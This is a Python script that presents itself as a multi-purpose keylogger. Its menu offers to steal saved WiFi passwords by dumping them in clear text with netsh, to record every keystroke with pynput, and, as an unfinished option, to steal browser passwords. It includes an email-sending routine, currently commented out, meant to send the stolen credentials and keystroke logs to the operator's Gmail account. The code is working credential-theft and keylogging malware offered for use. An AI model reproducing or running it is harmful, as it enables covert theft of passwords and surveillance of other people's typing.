import subprocess, smtplib, re, json, os, sqlite3, threading, time
import pynput.keyboard

outfile = ""
log = ""
interval = 0
choice = 0
#Function to send dumped passwords by email.
def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()



def wifi_creds():
    #Finding Network names connected with the endpoint.
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command,shell=True).decode('utf-8')
    network_list = re.findall("(?:Profile\s*:\s)(.*)(?:,|\r\n)", networks)

    global outfile
    #Dumping passwords of all the networks connected with the endpoint.
    result = []
    for network in network_list:
            add_command = 'netsh wlan show profile name=' + '"' + network + '"' + ' key=clear'
            credentials = subprocess.check_output(add_command, shell=True).decode('utf-8')
            network_name = re.findall("(?:Name\s*:\s)(.*)(?:,|\r\n)", credentials)
            password = re.findall("(?:Key Content\s*:\s)(.*)(?:,|\r\n)", credentials)
            result = result + (network_name + password)
    outfile = json.dumps(result)
    #send_mail("Email", "Password", outfile)
    with open("result.json", "w") as out_file:
        out_file.write(outfile)


def key_log(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    

def report():
    global log
    with open("log.txt", "w") as log_file:
        log_file.write(log)
    #send_mail("Email", "Password", log)
    timer = threading.Timer(10, report)
    timer.start()



def key_logger():
    listener = pynput.keyboard.Listener(on_press=key_log)
    with listener:
        report()
        listener.join()


#User Side code


print("░██████╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░\n" +
"██╔════╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗\n" +
"╚█████╗░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝\n" +
"░╚═══██╗██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗\n" +
"██████╔╝███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║\n" +
"╚═════╝░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝")
print("A Multi-Purpose Keylogger")
print("@ Written By Saket Shandilya\n\n")
print("-"*50)
print("[+] Choose the Option number below\n")

print("[1] Steal saved WiFi Passwords")
print("[2] Log Key Strokes")
print("[3] Steal Browser saved passwords")
print("-"*50)

choice = int(input("[+] Enter your choice option: "))

if choice == 0:
    print("Please enter a choice!!\n")
elif choice == 1:
    print("[+] Stealing Passwords")
    time.sleep(1)
    wifi_creds()
    time.sleep(1)
    print("[+] Stealed passwords saved in JSON file")
elif choice == 2:
    print("[+] Keys will start bein logged in 3 seconds")
    print("[-] To stop logging, kill the terminal")
    time.sleep(3)
    key_logger()
elif choice == 3:
    print("This feature is in beta testing!!")


